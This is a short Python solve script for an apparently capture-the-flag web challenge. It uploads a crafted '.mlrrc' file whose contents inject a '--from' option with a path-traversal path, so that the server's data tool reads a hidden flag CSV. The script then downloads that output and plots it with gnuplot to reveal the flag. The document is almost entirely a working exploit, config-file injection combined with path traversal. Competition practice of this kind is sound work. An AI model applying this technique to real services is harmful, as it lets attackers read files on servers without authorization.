from subprocess import PIPE, Popen

import requests


SERVER = 'http://graph.chal.hackthe.vote'

# PART 1: getting csv
s = requests.Session()
s.get(SERVER + '/signin')
s.post(
    SERVER + '/data',
    files={
        'csv': (
            '.mlrrc',
            '''--from\t../872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e/flag1.csv#,
''',
            'text/csv',
        )
    },
)
csv = s.get(SERVER + '/getfile/.mlrrc').content
csv = csv[:csv.find(b'\n-')]
with open('flag1.data', 'wb') as f:
    f.write(csv)


def gnuplot(in_filename, out_filename, points):
    plot = f"""
set terminal png size 2048,512
set output '{out_filename}'
set nokey
plot '{in_filename}' with {points}
"""
    # Version doesn't matter for this part
    p = Popen('gnuplot', text=True, stdin=PIPE, stderr=PIPE)
    output = p.communicate(input=plot)[1:]
    return p.returncode, output


gnuplot('flag1.data', 'flag1.png', 'points')
print("view flag1.png")
